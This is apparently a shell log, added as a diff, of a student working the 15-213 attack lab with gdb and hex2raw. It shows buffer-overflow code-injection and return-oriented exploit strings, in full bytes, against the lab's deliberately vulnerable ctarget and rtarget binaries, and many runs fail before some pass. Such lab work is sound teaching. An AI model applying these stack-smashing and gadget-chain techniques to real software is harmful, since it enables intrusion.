@@ -1,0 +1,906 @@
+jovyan@jupyter-10225501447:~$ cd ..
+jovyan@jupyter-10225501447:/home$ cd lab3
+bash: cd: lab3: No such file or directory
+jovyan@jupyter-10225501447:/home$ cd jovyan/
+jovyan@jupyter-10225501447:~$ cd lab3
+jovyan@jupyter-10225501447:~/lab3$ cd target35\
+> 
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x40186a
+Breakpoint 1 at 0x40186a: file buf.c, line 14.
+(gdb) disas
+No frame selected.
+(gdb) stepi
+The program is not being run.
+(gdb) r
+Starting program: /home/jovyan/lab3/target35/ctarget 
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, getbuf () at buf.c:14
+14      buf.c: No such file or directory.
+(gdb) si
+0x000000000040186d      14      in buf.c
+(gdb) p /x $rsp
+$1 = 0x5563e918
+(gdb) x /64xb $rsp
+0x5563e918:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e920:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e928:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e930:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e938:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e940:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e948:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
+0x5563e950:     0x32    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 128] will be killed.
+
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch2.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 E4 1E CD 30 68 A8 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 E9 63 55 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch2.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:ctarget:2:48 C7 C7 E4 1E CD 30 68 A8 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 E9 63 55 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch2.txt |./ctarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ^C
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3.s -o 3.o
+gcc: error: 3.s: No such file or directory
+gcc: fatal error: no input files
+compilation terminated.
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+(gdb) gcc -c 3.s -o 3.o
+Undefined command: "gcc".  Try "help".
+(gdb) q
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc
+gcc: fatal error: no input files
+compilation terminated.
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x401866
+Breakpoint 1 at 0x401866: file buf.c, line 12.
+(gdb) r -q
+Starting program: /home/jovyan/lab3/target35/ctarget -q
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, getbuf () at buf.c:12
+12      buf.c: No such file or directory.
+(gdb) info r rsp
+rsp            0x5563e950       0x5563e950
+(gdb) x 0x5563e950
+0x5563e950:     0x00401a32
+(gdb) x /64xb $rsp
+0x5563e950:     0x32    0x1a    0x40    0x00    0x00    0x00    0x00    0x00
+0x5563e958:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e960:     0xdd    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
+0x5563e968:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5563e970:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x5563e978:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x5563e980:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x5563e988:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+(gdb) p /x rsp
+No symbol "rsp" in current context.
+(gdb) p /x $rsp
+$1 = 0x5563e950
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 248] will be killed.
+
+Quit anyway? (y or n) y
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3raw.s -o l3.o
+3raw.s: Assembler messages:
+3raw.s: Warning: end of file not at end of a line; newline inserted
+3raw.s:1: Error: number of operands mismatch for `movq'
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3raw.s -o l3.o
+3raw.s: Assembler messages:
+3raw.s: Warning: end of file not at end of a line; newline inserted
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3raw.s -o l3.o
+3raw.s: Assembler messages:
+3raw.s: Warning: end of file not at end of a line; newline inserted
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump l3.o 
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRtUuTgAckK] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index,=links,=follow-links]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump l3.o -d
+
+l3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 50 e9 63 55    mov    $0x5563e950,%rdi
+   7:   68 08 19 40 00          pushq  $0x401908
+   c:   c3                      retq   
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 08 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 33 30 63 64 31 65 65 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 08 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 33 30 63 64 31 65 65 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 08 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 33 30 63 64 31 65 65 34 00 00 00 00 00 00 00 00 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:No exploit.  Getbuf returned 0x1
+Normal return
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 08 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 33 30 63 64 31 65 65 34 00 00 00 00 50 E9 63 55 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch2(0x22d22a00)
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch2(0x25459a00)
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ 00 00 00 00 00 00 00 00
+bash: 00: command not found
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch2(0x05787a00)
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Misfire: You called touch2(0xfc3b4a00)
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAILED
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:No exploit.  Getbuf returned 0x1
+Normal return
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget -q
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 7F 1A 40 00 00 00 00 00 CB 2B 40 00 00 00 00 00 E4 1E CD 30 00 00 00 00 A8 18 40 00 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch4.txt |./rtarget
+Cookie: 0x30cd1ee4
+Type string:Touch2!: You called touch2(0x30cd1ee4)
+Valid solution for level 2 with target rtarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+jovyan@jupyter-10225501447:~/lab3/target35$ gcc -c 3raw.s -o l3.o 
+3raw.s: Assembler messages:
+3raw.s: Warning: end of file not at end of a line; newline inserted
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump l3.o 
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRtUuTgAckK] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index,=links,=follow-links]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+jovyan@jupyter-10225501447:~/lab3/target35$ objdump l3.o -d
+
+l3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   48 c7 c7 50 e9 63 55    mov    $0x5563e950,%rdi
+   7:   68 b6 19 40 00          pushq  $0x4019b6
+   c:   c3                      retq   
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 33 30 63 64 31 65 65 34 00 00 00 00 50 E9 63 55 18 E9 63 55 00 00 00 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ 33 30 63 64 31 65 65 34
+bash: 33: command not found
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ gdb ctarget 
+GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) b *0x401866
+Breakpoint 1 at 0x401866: file buf.c, line 12.
+(gdb) r -q
+Starting program: /home/jovyan/lab3/target35/ctarget -q
+Cookie: 0x30cd1ee4
+
+Breakpoint 1, getbuf () at buf.c:12
+12      buf.c: No such file or directory.
+(gdb) i $rsp
+Undefined info command: "$rsp".  Try "help info".
+(gdb) i r $rsp
+rsp            0x5563e950       0x5563e950
+(gdb) q
+A debugging session is active.
+
+        Inferior 1 [process 1078] will be killed.
+
+Quit anyway? (y or n) y
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
+        result  35:FAIL:0xffffffff:ctarget:0:48 C7 C7 50 E9 63 55 68 B6 19 40 00 C3 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 E9 63 55 00 00 00 00 33 30 63 64 31 65 65 34 00 
+jovyan@jupyter-10225501447:~/lab3/target35$ ./hex2raw < tch3.txt |./ctarget -q
+Cookie: 0x30cd1ee4
+Type string:Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+        user id 10225501447
+        course  15213-f15
+        lab     attacklab
